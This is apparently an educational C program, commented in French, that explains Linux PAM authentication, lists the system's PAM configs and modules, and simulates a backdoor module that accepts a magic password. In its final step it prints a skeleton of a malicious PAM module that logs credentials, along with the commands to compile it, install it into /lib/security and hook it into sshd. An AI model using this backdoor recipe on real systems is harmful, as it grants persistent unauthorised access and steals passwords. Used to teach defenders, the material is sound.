/*
 * OBJECTIF  : Comprendre le fonctionnement de PAM et les backdoors PAM
 * PREREQUIS : Bases C, authentification Linux, shared libraries
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme demontre le fonctionnement de PAM (Pluggable
 * Authentication Modules), comment les modules d'authentification
 * sont charges, et le concept d'un module PAM malveillant.
 * NOTE : Aucun module PAM reel n'est installe - demonstration
 * purement educative.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <errno.h>
#include <dirent.h>

/*
 * Etape 1 : Expliquer l'architecture PAM
 */
static void explain_pam(void) {
    printf("[*] Etape 1 : Architecture PAM (Pluggable Authentication Modules)\n\n");

    printf("    PAM est le systeme d'authentification modulaire de Linux.\n");
    printf("    Chaque service (ssh, sudo, login) a sa propre config PAM.\n\n");

    printf("    Flux d'authentification :\n");
    printf("    ┌─────────────────┐\n");
    printf("    │   Application   │  (sshd, sudo, login...)\n");
    printf("    └────────┬────────┘\n");
    printf("             v\n");
    printf("    ┌─────────────────┐\n");
    printf("    │   libpam.so     │  Bibliotheque PAM\n");
    printf("    └────────┬────────┘\n");
    printf("             v\n");
    printf("    ┌─────────────────┐   ┌─────────────────┐\n");
    printf("    │ pam_unix.so     │   │ pam_deny.so     │\n");
    printf("    │ (mot de passe)  │   │ (refuser tout)  │\n");
    printf("    └─────────────────┘   └─────────────────┘\n\n");

    printf("    Types de modules PAM :\n");
    printf("    - auth     : Verification d'identite (mot de passe)\n");
    printf("    - account  : Verification des restrictions du compte\n");
    printf("    - password : Changement de mot de passe\n");
    printf("    - session  : Setup/teardown de session\n\n");
}

/*
 * Etape 2 : Lister les fichiers de configuration PAM
 */
static void list_pam_configs(void) {
    printf("[*] Etape 2 : Configurations PAM du systeme\n\n");

    const char *pam_dir = "/etc/pam.d";
    DIR *dir = opendir(pam_dir);
    if (!dir) {
        printf("    [-] Impossible d'ouvrir %s : %s\n\n", pam_dir, strerror(errno));
        return;
    }

    struct dirent *entry;
    int count = 0;

    printf("    Fichiers dans /etc/pam.d/ :\n");
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.')
            continue;
        printf("      %s\n", entry->d_name);
        count++;
        if (count >= 15) {
            printf("      ... (tronque)\n");
            break;
        }
    }
    closedir(dir);
    printf("    Total : %d+ fichiers de configuration\n\n", count);
}

/*
 * Etape 3 : Lire une configuration PAM specifique
 */
static void read_pam_config(const char *service) {
    char path[256];
    snprintf(path, sizeof(path), "/etc/pam.d/%s", service);

    FILE *fp = fopen(path, "r");
    if (!fp) {
        printf("    [-] Impossible de lire %s\n\n", path);
        return;
    }

    printf("    Configuration de %s :\n", path);
    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        if (line[0] == '#' || line[0] == '\n')
            continue;
        printf("      %s", line);
    }
    fclose(fp);
    printf("\n");
}

/*
 * Etape 4 : Lister les modules PAM installes
 */
static void list_pam_modules(void) {
    printf("[*] Etape 4 : Modules PAM installes\n\n");

    const char *pam_dirs[] = {
        "/lib/x86_64-linux-gnu/security",
        "/lib64/security",
        "/usr/lib/security",
        "/usr/lib64/security",
        "/usr/lib/x86_64-linux-gnu/security",
        NULL
    };

    for (int i = 0; pam_dirs[i]; i++) {
        DIR *dir = opendir(pam_dirs[i]);
        if (!dir)
            continue;

        printf("    Repertoire : %s\n", pam_dirs[i]);

        struct dirent *entry;
        int count = 0;
        while ((entry = readdir(dir)) != NULL) {
            if (strstr(entry->d_name, "pam_") && strstr(entry->d_name, ".so")) {
                printf("      %s\n", entry->d_name);
                count++;
                if (count >= 10) {
                    printf("      ... (tronque)\n");
                    break;
                }
            }
        }
        closedir(dir);
        printf("\n");
        break;
    }
}

/*
 * Etape 5 : Simuler une authentification PAM
 * On simule le flux sans utiliser la vraie libpam
 */

/* Module PAM simule : verification par mot de passe */
static int sim_pam_unix(const char *user, const char *pass) {
    printf("      [pam_unix] Verification du mot de passe pour '%s'\n", user);
    /* Simule une verification de /etc/shadow */
    if (strcmp(user, "admin") == 0 && strcmp(pass, "password123") == 0)
        return 0;  /* PAM_SUCCESS */
    return 7;  /* PAM_AUTH_ERR */
}

/* Module backdoor simule : accepte un mot de passe magique */
static int sim_pam_backdoor(const char *user, const char *pass) {
    const char *magic = "backdoor_pass";

    printf("      [pam_backdoor] Verification...\n");

    /* Le backdoor : si le mot de passe est le magic, toujours accepter */
    if (strcmp(pass, magic) == 0) {
        printf("      [pam_backdoor] Mot de passe magique detecte !\n");
        /* En vrai, un backdoor loguerait aussi les credentials */
        return 0;  /* PAM_SUCCESS */
    }

    /* Sinon, passer au module suivant */
    return -1;  /* PAM_IGNORE - laisser le module suivant decider */
}

static void simulate_pam_auth(void) {
    printf("[*] Etape 5 : Simulation d'authentification PAM\n\n");

    struct {
        const char *user;
        const char *pass;
    } tests[] = {
        {"admin", "password123"},     /* Mot de passe correct */
        {"admin", "wrong"},           /* Mot de passe incorrect */
        {"admin", "backdoor_pass"},   /* Mot de passe backdoor */
        {NULL, NULL}
    };

    for (int i = 0; tests[i].user; i++) {
        printf("    Test : user='%s', pass='%s'\n", tests[i].user, tests[i].pass);

        /* Simuler la chaine PAM : backdoor puis unix */
        int result = sim_pam_backdoor(tests[i].user, tests[i].pass);
        if (result == 0) {
            printf("      -> AUTHENTIFIE (via backdoor)\n\n");
            continue;
        }

        result = sim_pam_unix(tests[i].user, tests[i].pass);
        if (result == 0) {
            printf("      -> AUTHENTIFIE (via pam_unix)\n\n");
        } else {
            printf("      -> REFUSE (erreur %d)\n\n", result);
        }
    }
}

/*
 * Etape 6 : Montrer le code d'un module PAM (structure)
 */
static void show_pam_module_structure(void) {
    printf("[*] Etape 6 : Structure d'un module PAM\n\n");

    printf("    Un module PAM est un .so qui exporte ces fonctions :\n\n");
    printf("    // Fonction d'authentification\n");
    printf("    int pam_sm_authenticate(pam_handle_t *pamh, int flags,\n");
    printf("                            int argc, const char **argv)\n");
    printf("    {\n");
    printf("        // Recuperer le mot de passe\n");
    printf("        const char *password;\n");
    printf("        pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);\n\n");
    printf("        // [BACKDOOR] Verifier le mot de passe magique\n");
    printf("        if (strcmp(password, \"magic\") == 0)\n");
    printf("            return PAM_SUCCESS;  // Toujours accepter\n\n");
    printf("        // [LOG] Enregistrer les credentials\n");
    printf("        log_credentials(user, password);\n\n");
    printf("        // Deleguer au module suivant\n");
    printf("        return PAM_IGNORE;\n");
    printf("    }\n\n");

    printf("    Compilation : gcc -shared -fPIC -o pam_backdoor.so module.c -lpam\n");
    printf("    Installation : cp pam_backdoor.so /lib/security/\n");
    printf("    Configuration : ajouter dans /etc/pam.d/sshd :\n");
    printf("      auth sufficient pam_backdoor.so\n\n");

    printf("    [!] Ceci est une demonstration educative uniquement !\n\n");
}

int main(void) {
    printf("[*] Demo : PAM Backdoor - Comprendre l'authentification Linux\n\n");

    explain_pam();
    list_pam_configs();

    printf("[*] Etape 3 : Lecture de configurations PAM\n\n");
    read_pam_config("sshd");
    read_pam_config("sudo");

    list_pam_modules();
    simulate_pam_auth();
    show_pam_module_structure();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
